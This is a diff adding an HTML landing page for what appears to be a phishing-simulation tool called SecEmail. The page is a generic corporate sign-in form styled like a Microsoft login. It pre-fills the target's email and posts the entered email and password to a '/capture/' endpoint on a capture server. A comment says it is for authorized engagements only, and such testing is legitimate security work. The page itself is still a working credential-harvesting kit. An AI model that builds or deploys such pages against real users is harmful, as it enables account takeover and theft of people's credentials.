@@ -1,0 +1,98 @@
+<!-- SecEmail landing — authorized engagements only.
+     Generic corporate login page. The form POSTs to /capture/{{TOKEN}}
+     on the capture server. No registered trademarks, no external assets.
+     Runtime placeholders: {{COMPANY_NAME}}, {{TARGET_EMAIL}}, {{TOKEN}}. -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="x-apple-disable-message-reformatting">
+<title>Sign in · {{COMPANY_NAME}}</title>
+<style>
+  *,*::before,*::after { box-sizing:border-box; }
+  body { margin:0; padding:0; background:#f3f2f1; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; color:#1b1b1b; -webkit-font-smoothing:antialiased; }
+  .container { min-height:100vh; display:flex; align-items:center; justify-content:center; padding:24px; }
+  .card { width:100%; max-width:400px; background:#ffffff; border-radius:10px; padding:36px 32px; box-shadow:0 2px 12px rgba(0,0,0,0.08); }
+  .brand { display:flex; align-items:center; gap:10px; margin-bottom:24px; }
+  .brand-mark { width:36px; height:36px; background:#0078d4; border-radius:8px; display:flex; align-items:center; justify-content:center; color:#ffffff; font-weight:800; font-size:16px; }
+  .brand-name { font-size:14px; color:#605e5c; font-weight:600; letter-spacing:0.2px; }
+  h1 { margin:0 0 6px 0; font-size:22px; font-weight:600; color:#1b1b1b; letter-spacing:-0.2px; }
+  .lead { margin:0 0 24px 0; font-size:13px; color:#605e5c; line-height:1.55; }
+  label { display:block; font-size:12px; color:#605e5c; margin-bottom:6px; font-weight:500; letter-spacing:0.1px; }
+  input[type=email], input[type=password] {
+    width:100%; padding:11px 13px; font-size:14px; border:1px solid #d2d0ce; border-radius:5px;
+    margin-bottom:14px; background:#ffffff; color:#1b1b1b; transition:border-color 0.15s, box-shadow 0.15s;
+    font-family:inherit;
+  }
+  input[type=email]:focus, input[type=password]:focus {
+    outline:none; border-color:#0078d4; box-shadow:0 0 0 3px rgba(0,120,212,0.18);
+  }
+  .row-utility { display:flex; justify-content:space-between; align-items:center; margin-bottom:20px; font-size:12px; }
+  .row-utility label { display:flex; align-items:center; gap:6px; cursor:pointer; margin-bottom:0; color:#605e5c; font-weight:400; }
+  .row-utility a { color:#0078d4; text-decoration:none; font-weight:500; }
+  .row-utility a:hover { text-decoration:underline; }
+  button {
+    width:100%; padding:12px; background:#0078d4; color:#ffffff; border:0; border-radius:5px;
+    font-size:14px; font-weight:600; cursor:pointer; letter-spacing:0.2px; transition:background 0.15s;
+    font-family:inherit;
+  }
+  button:hover { background:#106ebe; }
+  button:active { background:#005a9e; }
+  .secondary { display:block; text-align:center; margin-top:14px; font-size:13px; color:#0078d4; text-decoration:none; }
+  .secondary:hover { text-decoration:underline; }
+  .divider { margin:22px 0; height:1px; background:#edebe9; }
+  .footer { font-size:11px; color:#a19f9d; line-height:1.6; text-align:center; }
+  .footer a { color:#a19f9d; text-decoration:underline; }
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="card">
+    <div class="brand">
+      <div class="brand-mark">●</div>
+      <div class="brand-name">{{COMPANY_NAME}}</div>
+    </div>
+
+    <h1>Sign in</h1>
+    <p class="lead">Sign in with your corporate account to continue to the resource shared with you.</p>
+
+    <form method="POST" action="/capture/{{TOKEN}}" autocomplete="off">
+      <label for="email">Corporate email</label>
+      <input
+        type="email"
+        id="email"
+        name="email"
+        value="{{TARGET_EMAIL}}"
+        required
+        autofocus
+        spellcheck="false"
+        autocapitalize="off">
+
+      <label for="password">Password</label>
+      <input
+        type="password"
+        id="password"
+        name="password"
+        required
+        spellcheck="false"
+        autocomplete="current-password">
+
+      <div class="row-utility">
+        <label><input type="checkbox" name="remember" value="1" style="margin:0;"> Keep me signed in</label>
+        <a href="#">Forgot your password?</a>
+      </div>
+
+      <button type="submit">Sign in</button>
+      <a href="#" class="secondary">Use a different account</a>
+    </form>
+
+    <div class="divider"></div>
+    <div class="footer">
+      IT support · {{COMPANY_NAME}}<br>
+      <a href="#">Privacy</a> · <a href="#">Terms</a>
+    </div>
+  </div>
+</div>
+</body>
+</html>
